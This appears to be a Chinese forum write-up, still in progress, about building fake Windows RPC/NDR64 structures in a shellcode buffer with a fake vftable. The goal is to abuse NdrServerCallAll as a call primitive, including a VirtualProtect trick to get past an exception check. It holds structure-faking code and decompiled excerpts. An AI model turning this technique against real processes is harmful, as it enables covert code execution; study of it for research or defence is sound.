
# `Ndr64pServerUnMarshal` 异常

## 结构体布局与填充

```
    RPC_MESSAGE* RpcMsg0 = (RPC_MESSAGE*)tmpShellcode;
    RPC_SERVER_INTERFACE* RpcInterfaceInfo0 =
        (RPC_SERVER_INTERFACE*)(tmpShellcode + 0x88);
    MIDL_SERVER_INFO* RpcSrvInfo0 =
        (MIDL_SERVER_INFO*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE));
    PVOID* DispatchTable0 =
        (PVOID*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
                 sizeof(MIDL_SERVER_INFO));
    MIDL_SYNTAX_INFO* SyntaxInfo0 =
        (MIDL_SYNTAX_INFO*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
                            sizeof(MIDL_SERVER_INFO) + sizeof(PVOID));
    MIDL_STUB_DESC* StubDesc0 =
        (MIDL_STUB_DESC*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
                          sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
                          sizeof(MIDL_SYNTAX_INFO) * 2);
    ULONG_PTR* FmtStrOffset0 =
        (ULONG_PTR*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
                     sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
                     sizeof(MIDL_SYNTAX_INFO) * 2 + sizeof(MIDL_STUB_DESC));
    NDR64_PROC_FORMAT* ProcStr0 =
        (NDR64_PROC_FORMAT*)(tmpShellcode + 0x88 +
                             sizeof(RPC_SERVER_INTERFACE) +
                             sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
                             sizeof(MIDL_SYNTAX_INFO) * 2 +
                             sizeof(MIDL_STUB_DESC) + sizeof(ULONG_PTR));

    //_NDR_PROC_CONTEXT Ndr+Proc
    DispatchTable0[0] = (PVOID)theNdrServerCallAllAddress;
    RpcSrvInfo0->DispatchTable =
        (SERVER_ROUTINE*)REMOTE_CLS_ADDRESS(DispatchTable0);

    FmtStrOffset0[0] = (ULONG_PTR)REMOTE_CLS_ADDRESS(ProcStr0);
    (SyntaxInfo0 + 1)->FmtStringOffset =
        (USHORT*)REMOTE_CLS_ADDRESS(FmtStrOffset0);
    RpcSrvInfo0->pSyntaxInfo =
        (MIDL_SYNTAX_INFO*)REMOTE_CLS_ADDRESS(SyntaxInfo0);
    RpcSrvInfo0->pStubDesc = (MIDL_STUB_DESC*)REMOTE_CLS_ADDRESS(StubDesc0);
    RpcSrvInfo0->DispatchTable =
        (SERVER_ROUTINE*)REMOTE_CLS_ADDRESS(DispatchTable0);
    // RpcSrvInfo0->FmtStringOffset = (unsigned short*)0x1337;
    RpcSrvInfo0->ProcString = (PFORMAT_STRING)0xAAAA;

    RpcInterfaceInfo0->InterpreterInfo =
        (MIDL_SERVER_INFO*)REMOTE_CLS_ADDRESS(RpcSrvInfo0);
    RpcMsg0->RpcInterfaceInformation =
        (RPC_SERVER_INTERFACE*)REMOTE_CLS_ADDRESS(RpcInterfaceInfo0);
    RpcMsg0->ProcNum = 0;
    RpcMsg0->RpcFlags = 0x1000;
```

这块没heroman真做不了，这个结构体非常复杂。网上有个公开的填充，但是是韩国人写的，代码更加不忍直视。

![18.png](https://attach.52pojie.cn/forum/202411/09/045115t0055kc288ftmrqj.png)

[18.png](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNDA0NXw1Njg1NThjMXwxNzkzNTc2Nzk1fDE2ODA4NnwxOTc5NjY3&nothumb=yes) (118.91 KB, 下载次数: 4)

2024-11-9 04:51 上传

## 标准结构体

这个就是标准的结构体了。

## 异常现象

直接执行会发现抛异常。

![19.png](https://attach.52pojie.cn/forum/202411/09/045157cplqtz4umzssvlql.png)

[19.png](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNDA0N3w3YWIxZWRjN3wxNzkzNTc2Nzk1fDE2ODA4NnwxOTc5NjY3&nothumb=yes) (37.61 KB, 下载次数: 4)

2024-11-9 04:51 上传

## 关键代码

[Asm] 纯文本查看 复制代码

```
LABEL_67:

    if ( !ThreadPointer )
      goto LABEL_58;

    goto LABEL_57;

  }

LABEL_18:

  result = a1->RpcMsg;

  Handle = a1->RpcMsg->Handle;

  if ( Handle )

  {

    if ( (*((_BYTE *)a1->pContext + 88) & 2) != 0 )

    {

      return (PRPC_MESSAGE)_guard_xfg_dispatch_icall_fptr(a1, a2);

    }

    else

    {

      result = (PRPC_MESSAGE)_guard_xfg_dispatch_icall_fptr(Handle, 5i64);

      if ( (_DWORD)result )

        RpcRaiseException(1783);

    }

  }
```

换个别人的，我的Windows太新了，有XFG：

[Asm] 纯文本查看 复制代码

```
LABEL_26:
  v25 = pStubMsg1->RpcMsg;
  v26 = (LRPC_SCALL *)pStubMsg1->RpcMsg->Handle;//VideoDirtListener, first entry of fake vftable
  if ( v26 )
  {
    if ( (pStubMsg1->pContext->Flags & 2) != 0 )
    {
      ...
    }
    else
    {
      v27 = *(int (__fastcall **)(LRPC_SCALL *, unsigned int))(*(_QWORD *)v26 + 0x100i64);
      if ( v27 == LRPC_SCALL::CleanupSystemHandles )
        LODWORD(v25) = LRPC_SCALL::CleanupSystemHandles(v26, 5u);
      else
        LODWORD(v25) = v27(v26, 5u);
      if ( (_DWORD)v25 )
        RpcRaiseException(1783);
    }
  }
  return (int)v25;
}
```

这个异常的原因是，他一定会执行 `handle + 0x100` 的地址，而且这个地址需要返回 `0`，否则会抛异常。韩国人的解决办法是填 `VirtualProtect`，这样他会返回 `false`，而也就接大欢喜了。

> `RpcMsg` 的地址是原始的 `VideoDirtListener`，`Handle` 假的 `vftable` 的地址存储在偏移量 `0` 处。所以 `v26` 会有这个假 `vftable` 的第一个条目的值；如果存储在内存中的地址加上 `0x100` 的值非零，它将调用它；如果返回值非零，则异常会被扔掉。如果只是将假 `vftable` 的第一个条目设置为 `0`，不是会因为没有进入 `if` 语句而立即返回吗？由于该部分 `NdrStubCall2` 中也被引用，因此不能设置为 `0`。因此，该部分中要调用的函数 `VirtualProtect` 被创建为。当操作因使用不正确的参数调用等原因而失败时，`VirtualProtect` 返回 `0`，因此我能够毫无异常地传递该部分！

无论如何，`RpcMsg->Buffer` 用于调用函数的所有参数都被复制到 `NdrStubCall2` 指向的 arg 堆栈中。然后，`Invoke` 期待已久的调用将被调用，其中包含要调用的函数的地址和存储要使用的参数的缓冲区作为参数！

### 增加代码如下

[Asm] 纯文本查看 复制代码

```
*(ULONG_PTR*)(tmpShellcode + 0x100) =
        (ULONG_PTR)VirtualProtect;  // 为了通过Ndr64pServerUnMarshal最后的那一段
```

## 参数问题

修复好后，继续往下走，会发现我们继续抛了异常：

![20.png](https://attach.52pojie.cn/forum/202411/09/045245lhl59fhlfhf9fh9a.png)

[20.png](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNDA0OHw1ZmUwZWE2YXwxNzkzNTc2Nzk1fDE2ODA4NnwxOTc5NjY3&nothumb=yes) (160.74 KB, 下载次数: 4)

2024-11-9 04:52 上传

出现的位置在 `for` 循环根据 `handle` 创建服务端 `handle` 的代码里面：

[Asm] 纯文本查看 复制代码

```
or ( i = 0; ; ++i )                          // 这一段在XP下应该是 Ndr64OutInit 被Ndr64pServerOutInit内链进来了
  {
    v108 = i;
    if ( i >= *((_DWORD *)v22 + 8) )
      break;
    pParam = (struct_pParam *)(v23 + 16i64 * i);//         pParamFlags = ( NDR64_PARAM_FLAGS * ) & ( Params[n].Attributes );
    pParamFlags = (struct_ProcStr0_2)pParam->Attributes;
    if ( (*(_WORD *)&pParamFlags & 0x800) != 0 )
    {
      pArg = (unsigned __int8 **)(*((_QWORD *)v22 + 6) + pParam->StackOffset);
      v103 = pArg;
      if ( *pArg )
        goto LABEL_33;
    }
    else if ( (*(_BYTE *)&pParamFlags & 8) == 0
           && ((*(_BYTE *)&pParamFlags & 0x20) == 0 || (*v24 & 0x100000) != 0)
           && (*(_BYTE *)&pParamFlags & 4) == 0 )
    {
      pArg = (unsigned __int8 **)(*((_QWORD *)v22 + 6) + pParam->StackOffset);
      v103 = pArg;
LABEL_33:
      if ( *(__int16 *)&pParamFlags >= 0 )
                  .....
```

他想读一个 `'Q'`，结果我那个地方是空指针。

![21.png](https://attach.52pojie.cn/forum/202411/09/045310bl2nor5n2m8kg2ir.png)

[21.png](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNDA0OXw3NzRhOWQyOHwxNzkzNTc2Nzk1fDE2ODA4NnwxOTc5NjY3&nothumb=yes) (23.82 KB, 下载次数: 4)

2024-11-9 04:53 上传

有什么办法可以跳过吗？

## 逆向分析与跳过思路

根据逆向调试，我们可以知道他跟 `params` 相关：

![22.png](https://attach.52pojie.cn/forum/202411/09/045317ael0un7papf0hdpq.png)

[22.png](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNDA1MHw2OTYxYWEzMnwxNzkzNTc2Nzk1fDE2ODA4NnwxOTc5NjY3&nothumb=yes) (23.82 KB, 下载次数: 3)

2024-11-9 04:53 上传

[Asm] 纯文本查看 复制代码

```
pParamFlags = ( NDR64_PARAM_FLAGS * ) & ( Params[n].Attributes );
```

基本上，他根据 `Attributes` 来判断这个flag是否需要进行操作。而我们没填任何 `Attributes`，导致他走到了 `Q` 的位置。

他读的位置，是 `ProcStr0` 的位置，读的是它之后的：

![23.png](https://attach.52pojie.cn/forum/202411/09/045329td3ejepj99988e8a.png)

[23.png](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjczNDA1MXwwNWQ2NTdmMnwxNzkzNTc2Nzk1fDE2ODA4NnwxOTc5NjY3&nothumb=yes) (67.84 KB, 下载次数: 4)

2024-11-9 04:53 上传

而他是按照 `pcontext.paramsnum` 来读的，`pcontext.paramsnum` 是在 `MulNdrpInitializeContextFromProc` 的时候初始化的，我们不可能控制。

鲁迅说得好，XP代码就是你的坚实后盾。当你一筹莫展的时候，看看XP代码。
